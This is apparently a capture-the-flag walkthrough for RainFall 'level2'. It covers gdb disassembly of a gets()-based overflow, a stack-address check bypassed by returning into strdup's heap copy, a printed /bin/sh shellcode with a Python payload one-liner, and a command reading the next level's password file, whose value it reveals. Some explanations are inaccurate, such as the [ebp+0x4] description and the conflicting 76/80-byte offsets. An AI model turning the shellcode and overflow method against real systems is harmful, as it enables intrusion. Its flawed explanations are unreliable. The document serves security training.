## 1 Uderstand what level2 binary do

When we trying execute it we see, that it waiting for an input, print it and quit after press enter.

``` bash
level2@RainFall:~$ ./level2 
igkfjhgskljdhfglkjsdfh
igkfjhgskljdhfglkjsdfh
```
## 2 Lets analyzy assembler code of  level2

1. see functions
``` bash
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048358  _init     
0x080483a0  printf    
0x080483a0  printf@plt
0x080483b0  fflush    
0x080483b0  fflush@plt
0x080483c0  gets      
0x080483c0  gets@plt  
0x080483d0  _exit     
0x080483d0  _exit@plt 
0x080483e0  strdup
0x080483e0  strdup@plt
0x080483f0  puts
0x080483f0  puts@plt
0x08048400  __gmon_start__
0x08048400  __gmon_start__@plt
0x08048410  __libc_start_main
0x08048410  __libc_start_main@plt
0x08048420  _start
0x08048450  __do_global_dtors_aux
0x080484b0  frame_dummy
0x080484d4  p
0x0804853f  main
0x08048550  __libc_csu_init
```

2. Disass main
``` bash
(gdb) disass main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
(gdb)
```

Let’s analyze the disassembled `main` function line by line and explain what each instruction does:

---

### **1. `0x0804853f <+0>: push %ebp`**
- **Purpose**: This saves the previous base pointer (`%ebp`) on the stack.
- **Reason**: This is the prologue of the function. It preserves the caller's stack frame pointer to allow restoring it later when the function returns.

---

### **2. `0x08048540 <+1>: mov %esp, %ebp`**
- **Purpose**: Copies the current stack pointer (`%esp`) into the base pointer (`%ebp`).
- **Reason**: This sets up the base pointer for the current function's stack frame, which will allow access to local variables and function parameters relative to `%ebp`.

---

### **3. `0x08048542 <+3>: and $0xfffffff0, %esp`**
- **Purpose**: Aligns the stack pointer to a 16-byte boundary by masking off the last four bits of `%esp`.
- **Reason**: Many platforms and calling conventions (e.g., System V x86 ABI) require 16-byte stack alignment for performance and compatibility, particularly for SIMD operations or function calls.

---

### **4. `0x08048545 <+6>: call 0x80484d4 <p>`**
- **Purpose**: Calls the function at address `0x80484d4`, which is named `p` in this context.
- **Reason**: This transfers control to the `p` function, saving the return address (address of the next instruction) on the stack. It's likely a subroutine that the `main` function needs to execute.

---

### **5. `0x0804854a <+11>: leave`**
- **Purpose**: Reverses the prologue and restores the previous stack frame.
    - `mov %ebp, %esp`: Sets the stack pointer (`%esp`) to the base pointer (`%ebp`), effectively deallocating the stack space used by this function.
    - `pop %ebp`: Restores the saved base pointer (`%ebp`) for the caller's stack frame.
- **Reason**: Cleans up the stack frame and prepares to return control to the calling function.

---

### **6. `0x0804854b <+12>: ret`**
- **Purpose**: Returns control to the address saved on the stack by the previous `call` instruction.
- **Reason**: This ends the execution of the `main` function and transfers control back to the calling process (the program loader in this case).

---

### Why These Steps?
1. **Prologue** (`push`, `mov`, `and`): Sets up the function's stack frame, aligns the stack, and ensures it is ready for execution.
2. **Call Subroutine**: Executes the logic defined in the `p` function.
3. **Epilogue** (`leave`, `ret`): Cleans up the stack and returns to the caller, ensuring the program state is correctly restored.

This sequence is a standard function prologue and epilogue for x86 assembly, adhering to the calling conventions and stack discipline for clean and predictable function execution.


3.  Analyzye p function

``` bash

(gdb) disass p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```

---

### **0x080484d4 <+0>: push ebp**
- **Action**: Pushes the base pointer (`%ebp`) of the caller function onto the stack.
- **Purpose**: Saves the old base pointer to set up a new stack frame for the `p` function.

---

### **0x080484d5 <+1>: mov ebp, esp**
- **Action**: Copies the current stack pointer (`%esp`) into the base pointer (`%ebp`).
- **Purpose**: Marks the starting point of the stack frame for this function. This allows accessing function arguments and local variables relative to `%ebp`.

---

### **0x080484d7 <+3>: sub esp, 0x68**
- **Action**: Decreases the stack pointer by 0x68 (104 bytes).
- **Purpose**: Allocates space on the stack for local variables of this function.

---

### **0x080484da <+6>: mov eax, ds:0x8049860**
- **Action**: Loads the value at memory address `0x8049860` into the `eax` register.
- **Purpose**: Retrieves data from the data segment. Likely a global variable or pointer.

---

### **0x080484df <+11>: mov DWORD PTR [esp], eax**
- **Action**: Copies the value of `eax` into the memory pointed to by `%esp`.
- **Purpose**: Prepares the argument for the next function call.

---

### **0x080484e2 <+14>: call 0x80483b0 <fflush@plt>**
- **Action**: Calls the `fflush()` function.
- **Purpose**: Flushes the output buffer, ensuring any pending data is written to the output stream.

---

### **0x080484e7 <+19>: lea eax, [ebp-0x4c]**
- **Action**: Loads the effective address of `[ebp-0x4c]` into `eax`.
- **Purpose**: Prepares a pointer to a local variable (offset `-0x4c` in the stack frame).

---

### **0x080484ea <+22>: mov DWORD PTR [esp], eax**
- **Action**: Places the address `[ebp-0x4c]` (from `eax`) onto the stack.
- **Purpose**: Sets up the argument for the next function call.

---

### **0x080484ed <+25>: call 0x80483c0 <gets@plt>**
- **Action**: Calls the `gets()` function.
- **Purpose**: Reads input from the user and stores it in the buffer at `[ebp-0x4c]`.  
- **Risk**: `gets()` does not perform bounds checking, making this a **vulnerability**. If input exceeds the buffer size, it could lead to a **buffer overflow**.

---

### **0x080484f2 <+30>: mov eax, DWORD PTR [ebp+0x4]**
- **Action**: Loads the value at `[ebp+0x4]` (likely a function argument) into `eax`.
- **Purpose**: Retrieves the first argument passed to the function.

---

### **0x080484f5 <+33>: mov DWORD PTR [ebp-0xc], eax**
- **Action**: Stores the value of `eax` into `[ebp-0xc]`.
- **Purpose**: Saves the first argument into a local variable.

---

### **0x080484f8 <+36>: mov eax, DWORD PTR [ebp-0xc]**
- **Action**: Loads the value at `[ebp-0xc]` into `eax`.
- **Purpose**: Prepares the value of the local variable for processing.

---

### **0x080484fb <+39>: and eax, 0xb0000000**
- **Action**: Performs a bitwise AND operation on `eax` with the value `0xb0000000`.
- **Purpose**: Checks if specific bits (corresponding to `0xb0000000`) are set in `eax`.

---

### **0x08048500 <+44>: cmp eax, 0xb0000000**
- **Action**: Compares `eax` with `0xb0000000`.
- **Purpose**: Determines if `eax` contains the expected bits.

---

### **0x08048505 <+49>: jne 0x8048527 <p+83>**
- **Action**: Jumps to address `0x8048527` if the comparison result is not equal (zero flag is not set).
- **Purpose**: Skips the error-handling block if the condition is not met.

---

### **0x08048507 <+51>: mov eax, 0x8048620**
- **Action**: Loads the value `0x8048620` into `eax`.
- **Purpose**: Prepares a pointer (likely to an error message) for printing.

---

### **0x0804850c <+56>: mov edx, DWORD PTR [ebp-0xc]**
- **Action**: Loads the value at `[ebp-0xc]` into `edx`.
- **Purpose**: Prepares an argument for the next function call.

---

### **0x0804850f <+59>: mov DWORD PTR [esp+0x4], edx**
- **Action**: Places the value of `edx` into `[esp+0x4]`.
- **Purpose**: Sets the second argument for the `printf()` function.

---

### **0x08048513 <+63>: mov DWORD PTR [esp], eax**
- **Action**: Places the value of `eax` into `[esp]`.
- **Purpose**: Sets the first argument for the `printf()` function.

---

### **0x08048516 <+66>: call 0x80483a0 <printf@plt>**
- **Action**: Calls the `printf()` function.
- **Purpose**: Prints the error message to the console.

---

### **0x0804851b <+71>: mov DWORD PTR [esp], 0x1**
- **Action**: Places the value `1` onto the stack.
- **Purpose**: Prepares the argument for `_exit()`.

---

### **0x08048522 <+78>: call 0x80483d0 <_exit@plt>**
- **Action**: Calls the `_exit()` function.
- **Purpose**: Exits the program with a status of `1`.

---

### **0x08048527 <+83>: lea eax, [ebp-0x4c]**
- **Action**: Loads the address of `[ebp-0x4c]` into `eax`.
- **Purpose**: Retrieves the pointer to the buffer.

---

### **0x0804852a <+86>: mov DWORD PTR [esp], eax**
- **Action**: Places the value of `eax` onto the stack.
- **Purpose**: Sets the argument for the `puts()` function.

---

### **0x0804852d <+89>: call 0x80483f0 <puts@plt>**
- **Action**: Calls the `puts()` function.
- **Purpose**: Prints the user input stored in the buffer.

---

### **0x08048532 <+94>: lea eax, [ebp-0x4c]**
- **Action**: Loads the address of `[ebp-0x4c]` into `eax`.
- **Purpose**: Prepares the pointer to the buffer.

---

### **0x08048535 <+97>: mov DWORD PTR [esp], eax**
- **Action**: Places the value of `eax` onto the stack.
- **Purpose**: Sets the argument for the `strdup()` function.

---

### **0x08048538 <+100>: call 0x80483e0 <strdup@plt>**
- **Action**: Calls the `strdup()` function.
- **Purpose**: Creates a duplicate of the user input string in a new memory location.

---

### **0x0804853d <+105>: leave**
- **Action**: Restores the caller's stack frame by:
  - Setting `%esp` back to `%ebp`.
  - Popping `%ebp` from the stack.

---

### **0x0804853e <+106>: ret**
- **Action**: Pops the return address from the stack and jumps to it.
- **Purpose**: Returns control to the caller function.

---

### **Summary**
1. Reads input using `gets()` (vulnerable).
2. Checks if a specific condition (`eax & 0xb0000000`) is met.
3. Handles errors by printing a message and exiting if the condition is true.
4. Otherwise, prints the input, duplicates it, and exits gracefully. 

This function contains a **buffer overflow vulnerability** because of the use of `gets()`.

But in p function we see this check

``` bash
   0x080484fb <+39>:    and    eax,0xb0000000
   0x08048500 <+44>:    cmp    eax,0xb0000000
```


### The Code Explanation

```assembly
0x080484fb <+39>:    and    eax, 0xb0000000
0x08048500 <+44>:    cmp    eax, 0xb0000000
```

1. **The `and` instruction**:  
   ```assembly
   and eax, 0xb0000000
   ```
   - This operation takes the value in the `eax` register and performs a **bitwise AND** with `0xb0000000`. In hexadecimal, `0xb0000000` looks like this in binary:
   ```
   1011 0000 0000 0000 0000 0000 0000 0000
   ```
   - The **bitwise AND** operation essentially masks out certain parts of the value in `eax`. Only the upper 4 bits (the `b` in `0xb0000000`) will be preserved; all other bits will be zeroed out.
   - For example, if `eax` contained the value `0xbf000000` (which is in the stack region as you've mentioned), the result of the `and` operation would be `0xb0000000` because the lower bits are masked out.

2. **The `cmp` instruction**:  
   ```assembly
   cmp eax, 0xb0000000
   ```
   - This instruction compares the value in `eax` with `0xb0000000`. It sets the flags in the processor based on the result (whether `eax` is equal to, less than, or greater than `0xb0000000`).
   - If the value in `eax` is equal to `0xb0000000` (which is the result of the `and` operation), this comparison will confirm that `eax` points to an address starting with `0xb`.

### The Purpose of the Check

The goal of this code appears to be to **restrict the return address** that can be used. The restriction is on addresses that start with the `b` bit (i.e., addresses in the range `0xb0000000` to `0xbfffffff`), which typically corresponds to the **stack region**.

### Why This Matters

This restriction makes it **difficult or impossible** to use **stack-based shellcode**. Here’s why:

- The **stack** region in memory on many systems falls in the address range starting from `0xbf000000` to `0xbfffffff` (the specific range can vary, but this is a common one).
- Since the `and` operation checks for values starting with `b`, it prevents the return address from being in that range.
  

Since the program prevents using the stack to store the return address or shellcode, the next logical step is to use the **heap** instead.

- The **heap** is a region of memory used for dynamic memory allocation, typically managed by `malloc()` or similar functions.
- In the context of this program, the function `strdup` is used, which calls `malloc` to allocate memory for a string. Memory allocated by `malloc` is typically on the **heap**.
- The heap does not fall under the `0xb0000000` restriction, so we can potentially use the heap to store **payloads** or **return addresses** to bypass the stack restriction.


The check blocks addresses that fall within the stack region, which is a common technique to **prevent stack-based buffer overflow exploits** where we can store malicious shellcode on the stack. However, by shifting the focus to the heap (which is not restricted in the same way), we can still find ways to control the flow of execution.

The code in the program uses the `and` operation with `0xb0000000` to mask the top bits of the address, thereby enforcing a restriction that the return address **cannot** fall in the `0xbf000000` to `0xbfffffff` range, which typically represents the stack. This forces us to use the **heap** (allocated by functions like `malloc`) for storing shellcode or return addresses to hijack the control flow, since the heap is **not restricted** by this bitmask.

We can notice that  the buffer is later copied inside a strdup, which use malloc who store the memory in  the heap.

``` bash
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
```

Malloc always return the address 0x804a008 :


``` bash

level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                                            = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
)                                                                 = 0xbffff6fc
puts(""
)                                                                                                      = 1
strdup("")                                                                                                    = 0x0804a008
+++ exited (status 8) +++
```

Now we can try to copy a shellcode in the heap by writing it in the input prompt and then write the allocated address (malloc) on the return address.

``` bash
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

The byte sequence `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80` is a **shellcode** that is used to invoke the **`execve`** system call to execute the `/bin/sh` shell. It is specifically designed to spawn a shell by calling `execve` with the arguments `/bin//sh`. Here's a breakdown of the sequence:

### Breakdown of the Shellcode:

1. **`\x6a\x0b`**:  
   - `push 0x0b`
   - This pushes the value `0x0b` onto the stack. The value `0x0b` corresponds to the syscall number for `execve` in Linux (which is `11` in decimal).

2. **`\x58`**:  
   - `pop eax`
   - Pops the top value from the stack into the `eax` register, which now holds the `execve` syscall number `0x0b`.

3. **`\x99`**:  
   - `cdq`
   - Clears the `edx` register by copying the value of `eax` into `edx` (a sign-extension trick). This will set `edx` to `0`, as `eax` is `0x0b`.

4. **`\x52`**:  
   - `push edx`
   - Pushes the value of `edx` (which is `0`, a null pointer) onto the stack. This represents the `envp` argument (environment variables) for `execve`, which is expected to be a null pointer.

5. **`\x68\x2f\x2f\x73\x68`**:  
   - `push 0x68732f2f`
   - Pushes the string `//sh` onto the stack in little-endian format (`0x68732f2f`). This is part of the path to the shell (`/bin/sh`), but with an extra `/` to bypass the null byte.

6. **`\x68\x2f\x62\x69\x6e`**:  
   - `push 0x6e69622f`
   - Pushes the string `/bin` onto the stack in little-endian format (`0x6e69622f`), completing the full path `/bin//sh` on the stack.

7. **`\x89\xe3`**:  
   - `mov ebx, esp`
   - Moves the address of the string `/bin//sh` (which is now on the stack) into the `ebx` register. `ebx` will point to the path of the shell when calling `execve`.

8. **`\x31\xc9`**:  
   - `xor ecx, ecx`
   - Clears the `ecx` register (sets it to `0`). This represents the `argv` argument for `execve`, which is expected to be a null pointer. `execve` requires both `argv` and `envp` to be null.

9. **`\xcd\x80`**:  
   - `int 0x80`
   - This triggers a software interrupt, causing the kernel to perform the system call specified in `eax` (which is `execve` with the path `/bin//sh` in `ebx`, `argv` in `ecx`, and `envp` in `edx`). This system call will invoke `/bin/sh`, giving the attacker a shell.


- **Objective**: The goal of this shellcode is to spawn a shell (`/bin/sh`) when executed. This is commonly used in buffer overflow exploits to execute arbitrary code.
  
- **How it works**:  
  - The shellcode first sets up the `execve` system call, which is used to execute programs in Linux.
  - It places the path to the shell (`/bin//sh`) in the right place (in `ebx`).
  - It sets the arguments for `execve` to `null` (in `ecx` and `edx`).
  - Finally, it makes the system call (`int 0x80`), which runs the shell.

This shellcode is designed to **spawn a shell** (`/bin/sh`) on a Linux system, typically used in the context of exploiting a buffer overflow vulnerability. When this shellcode is executed, it gives the attacker access to a command-line interface (a shell), allowing them to run arbitrary commands.


pattern generating 

``` bash 
python -c 'print "a" * 84' > /tmp/pattern.txt
Now run the program in GDB with the generated input:

(gdb) r < /tmp/pattern.txt
```

This will cause the program to crash due to the buffer overflow. The crash will show the value of the program counter (EIP) and help us determine the offset.

In GDB, you should see something like this:
``` bash
(gdb) r < /tmp/pattern.txt 
Starting program: /home/user/level2/level2 < /tmp/pattern.txt
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```
The value 0x61616161 corresponds to the character 'a'. This means we’ve overflowed the buffer at 76 bytes, which is the exact offset where the return address is stored.

Given that our shellcode is 21 bytes long, we can pad the remaining space with any arbitrary byte sequence until we reach 80 bytes, and then append the 4 bytes that represent the return address.

Thus, the structure of our final attack buffer will be:

Shellcode: 21 bytes
Padding (arbitrary data): 59 bytes
Return address: 4 bytes

``` bash
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit

level2@RainFall:~$ cat /tmp/exploit - | ./level2
j
 XRh//shh/bin1̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
cat /home/user/level3/.pass  
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
level2@RainFall:~$ su level3
Password:
```

